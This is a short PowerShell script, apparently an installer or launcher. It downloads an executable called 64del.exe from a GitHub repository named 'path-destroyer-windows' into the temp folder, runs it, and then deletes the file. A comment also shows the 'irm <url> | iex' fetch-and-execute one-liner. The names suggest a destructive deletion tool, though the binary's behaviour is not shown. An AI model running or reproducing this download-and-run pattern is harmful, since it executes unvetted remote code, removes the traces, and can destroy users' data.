# NOTE: when we write run binary file (OS is doesn't metter) we need to run install script
# irm https://example.com/branch_name/run_script_name.ps1 | iex
# -------------------------------------------------------------
# remote download url
$url = "https://raw.githubusercontent.com/Toaster123G/path-destroyer-windows/main/64del.exe"
# dowloadable like tenporarely file
$tmp = "$env:TEMP/64del.exe"

Invoke-WebRequest $url -Outfile $tmp
& $tmp
Remove-Item $tmp
